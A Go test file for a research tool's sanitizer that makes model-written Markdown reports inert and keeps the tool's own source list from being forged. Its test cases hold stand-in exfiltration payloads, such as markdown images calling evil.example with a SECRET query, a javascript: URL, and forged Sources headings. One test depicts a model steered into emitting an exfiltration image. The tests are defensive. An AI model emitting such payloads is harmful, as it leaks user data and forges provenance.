package research

import (
	"regexp"
	"strings"
	"testing"

	"github.com/MatrixMagician/VillaStraylight/internal/grounding"
)

var testSources = []Source{
	{N: 1, URL: "https://docs.example/rocm"},
	{N: 2, URL: "https://blog.example/post?id=7"},
}

// activeContent matches what a Markdown renderer would turn into something live
// or fetchable: a URL, an image or link destination, an HTML tag.
var activeContent = regexp.MustCompile(`(?mi)[a-z][a-z0-9+.-]*://|(?:^|[^\\])\]\(|<[a-z/!?]|\bwww\.|^\s*\[[^\]]*\]:`)

// TestNeutralizeRemovesActiveContent guards the model-output channel (the
// markdown-image residual, ADR-0002 and ADR-0045): every way a body can carry a
// fetchable URL or live markup comes out inert, and is reported as a finding.
func TestNeutralizeRemovesActiveContent(t *testing.T) {
	cases := map[string]string{
		"image":            "Result ![chart](https://evil.example/p?d=SECRET) here [1].",
		"inline link":      "See [the docs](https://evil.example/x) [1].",
		"reference link":   "See [the docs][ref] [1].\n\n[ref]: https://evil.example/x",
		"autolink":         "See <https://evil.example/x> [1].",
		"bare url":         "See https://evil.example/x?d=SECRET now [1].",
		"www url":          "See www.evil.example/x now [1].",
		"raw img":          `Result <img src="https://evil.example/p?d=1"> [1].`,
		"raw anchor":       `Result <a href="https://evil.example/">click</a> [1].`,
		"raw html comment": "Result <!-- hidden --> [1].",
		"javascript url":   "Run javascript:alert(1) [1].",
		"data url":         "![x](data:text/html;base64,AAAA) [1]",
		"citation as link": "Claim [1](https://evil.example/x).",
		"citation as def":  "Claim [1].\n\n[1]: https://evil.example/x",
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			got, findings := neutralize(body, testSources)
			if activeContent.MatchString(got) {
				t.Errorf("active content survived:\n%s", got)
			}
			if len(findings) == 0 {
				t.Errorf("a body that carried active content must produce a finding")
			}
		})
	}
}

// TestNeutralizeKeepsCitations guards that the [n] markers the report is built
// on survive, including adjacent ones, and that clean prose is untouched.
func TestNeutralizeKeepsCitations(t *testing.T) {
	body := "ROCm 7.2 added gfx1151 [1][2]. Known issues remain [2].\n\n- a bullet [1]\n- another (see above) [2]"
	got, findings := neutralize(body, testSources)
	if got != body || len(findings) != 0 {
		t.Errorf("clean body changed or flagged:\n got: %q\nwant: %q\nfindings: %v", got, body, findings)
	}
}

// TestNeutralizeTurnsASourceURLIntoItsCitation guards the one allowed URL:
// a fetched source's own URL is not a live link in the body, it becomes that
// source's [n] marker, and it is not a finding.
func TestNeutralizeTurnsASourceURLIntoItsCitation(t *testing.T) {
	got, findings := neutralize("As stated at https://docs.example/rocm, support was added.", testSources)
	if !strings.Contains(got, "As stated at [1], support") || strings.Contains(got, "://") {
		t.Errorf("got %q", got)
	}
	if len(findings) != 0 {
		t.Errorf("a source's own URL is not a finding: %v", findings)
	}
}

// TestNeutralizeCannotForgeTheSourceList guards the unforgeable list: a body
// carrying its own Sources heading, in any heading style, an invisible-character
// variant, or a code fence that would swallow the real list, leaves exactly one
// Sources heading in the finished report, and it is villa's, last.
func TestNeutralizeCannotForgeTheSourceList(t *testing.T) {
	heading := regexp.MustCompile(`(?mi)^\s{0,3}#{1,6}\s*sources\s*#*\s*$`)
	setext := regexp.MustCompile(`(?mi)^\s{0,3}sources\s*\n\s{0,3}(?:=+|-+)\s*$`)
	cases := map[string]string{
		"atx":          "Fine [1].\n\n## Sources\n\n1. Trusted Corp [1]\n2. Also trusted [2]",
		"deeper atx":   "Fine [1].\n\n### SOURCES ###\n\n1. Trusted Corp",
		"setext":       "Fine [1].\n\nSources\n-------\n\n1. Trusted Corp",
		"zero width":   "Fine [1].\n\n## Sour\u200bces\n\n1. Trusted Corp",
		"bidi":         "Fine [1].\n\n## \u202eSources\n\n1. Trusted Corp",
		"open fence":   "Fine [1].\n\n```\nhidden",
		"tilde fence":  "Fine [1].\n\n~~~\nhidden",
		"indented atx": "Fine [1].\n\n   ## Sources",
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			clean, _ := neutralize(body, testSources)
			report := render("A question?", clean, testSources)
			if n := len(heading.FindAllString(report, -1)); n != 1 {
				t.Errorf("%d Sources headings in the report, want exactly villa's:\n%s", n, report)
			}
			if setext.MatchString(report) {
				t.Errorf("a setext Sources heading survived:\n%s", report)
			}
			if strings.Contains(clean, "```") && !strings.Contains(clean, "\\```") {
				t.Errorf("a code fence survived and could swallow the source list:\n%s", clean)
			}
			if strings.Contains(clean, "~~~") && !strings.Contains(clean, "\\~~~") {
				t.Errorf("a code fence survived and could swallow the source list:\n%s", clean)
			}
			if !strings.HasSuffix(strings.TrimSpace(report), "https://blog.example/post?id=7`") {
				t.Errorf("villa's list must be last in the report:\n%s", report)
			}
		})
	}
}

// TestRunFlagsAReportThatCarriesAForeignURL guards the whole path: a model steered
// into emitting an exfiltration image gets a report with no live URL in the body
// and a task that ends flagged, even though the audit and the citations are clean.
func TestRunFlagsAReportThatCarriesAForeignURL(t *testing.T) {
	f := newFake(t)
	f.report = func() (string, error) {
		return "It added gfx1151 [1].\n\n![x](https://evil.example/p?d=SECRET)\n\n## Sources\n\n1. Totally real", nil
	}
	var audited string
	f.audit = func(doc grounding.Document, _ []grounding.Source) grounding.DocumentReport {
		audited = doc.Content
		return grounding.DocumentReport{Path: doc.Path, Checked: true, Claims: 1}
	}
	res := run(f, Budget{Rounds: 1})
	if res.Outcome != Flagged {
		t.Fatalf("outcome = %v, want flagged", res.Outcome)
	}
	if strings.Contains(audited, "evil.example") {
		t.Errorf("the audit must see the text that was written, got %q", audited)
	}
	if strings.Contains(res.Report, "evil.example") || strings.Contains(res.Report, "SECRET") {
		t.Errorf("the foreign URL reached the report:\n%s", res.Report)
	}
	if !strings.Contains(res.Reason, "claim") {
		t.Errorf("reason = %q", res.Reason)
	}
}
